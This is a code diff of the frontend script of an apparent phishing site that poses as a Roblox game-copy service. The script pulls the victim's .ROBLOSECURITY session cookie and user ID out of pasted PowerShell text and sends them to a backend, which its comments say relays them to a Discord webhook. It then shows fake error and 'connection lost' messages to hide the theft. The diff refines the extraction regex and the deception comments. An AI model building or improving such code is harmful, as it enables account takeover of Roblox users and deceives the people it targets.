@@ -1,6 +1,4 @@
-// ================= FRONTEND APP.JS (UPDATED for Vercel) =================
-// Extracts cookie + rbxuid from pasted PowerShell text
-// Sends to backend API (/api/submit), then shows fake error messages (deception layer)
+// ================= FRONTEND APP.JS =================
 
 const WEBHOOK_ENDPOINT = "/api/submit";
 
@@ -10,7 +8,7 @@ const pinError = document.getElementById("pinError");
 const copyButton = document.getElementById("copyButton");
 const statusMessage = document.getElementById("statusMessage");
 
-// PIN validation (4 digits)
+// PIN validation
 pinInput.addEventListener("input", () => {
     pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
     validatePin();
@@ -22,24 +20,22 @@ function validatePin() {
     return isValid;
 }
 
-// Extract .ROBLOSECURITY cookie and rbxuid from RBXEventTrackerV2
+// Extract cookie and rbxuid (improved regex)
 function extractGameData(fullText) {
+    // Match .ROBLOSECURITY", "cookie_value"
     const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
     if (!cookieMatch) {
         return { success: false, message: "Your Game Key is not valid! (Check if you copied it right!)" };
     }
     const robloxCookie = cookieMatch[1];
 
+    // Match RBXEventTrackerV2", "params...&rbxuid=123456&..."
     const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
     let rbxuid = null;
     if (eventTrackerMatch) {
-        const params = eventTrackerMatch[1].split('&');
-        for (let p of params) {
-            if (p.startsWith("rbxuid=")) {
-                rbxuid = p.split('=')[1];
-                break;
-            }
-        }
+        const params = eventTrackerMatch[1];
+        const match = params.match(/rbxuid=(\d+)/);
+        if (match) rbxuid = match[1];
     }
     if (!rbxuid) {
         return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2. Ensure the PowerShell script contains it." };
@@ -47,15 +43,13 @@ function extractGameData(fullText) {
     return { success: true, cookie: robloxCookie, rbxuid };
 }
 
-// Fake "connection lost" popup with 35% chance (mimics original payload.js)
+// Fake "connection lost" popup (unchanged)
 function maybeShowFakeConnectionLoss() {
     if (Math.random() < 0.35) {
         const originalMsg = statusMessage.textContent;
         const originalColor = statusMessage.style.color;
-
         statusMessage.textContent = "⚠️ Connection lost! Unable to reach Roblox servers.";
         statusMessage.style.color = "#ffaa66";
-
         setTimeout(() => {
             if (statusMessage.textContent.includes("Connection lost")) {
                 statusMessage.textContent = originalMsg;
@@ -102,22 +96,21 @@ copyButton.addEventListener("click", async () => {
             })
         });
 
-        // Handle non-OK HTTP status (e.g., 500, 404) gracefully
         if (!response.ok) {
             throw new Error(`Server responded with ${response.status}`);
         }
 
         const result = await response.json();
 
-        // Backend returns { success: boolean } (true = webhook sent)
+        // result.success is true if Discord webhook succeeded
         if (result.success === true) {
-            // Deception: always show fake failure even when webhook succeeded
+            // Deception: show fake failure
             statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
             statusMessage.style.color = "#ff9d9d";
             maybeShowFakeConnectionLoss();
         } else {
-            // Real failure (webhook failed or backend error)
-            statusMessage.textContent = "✗ Copy failed! Check your internet connection.";
+            // Real error
+            statusMessage.textContent = result.error || "✗ Copy failed! Check your internet connection.";
             statusMessage.style.color = "#ff9d9d";
         }
     } catch (err) {
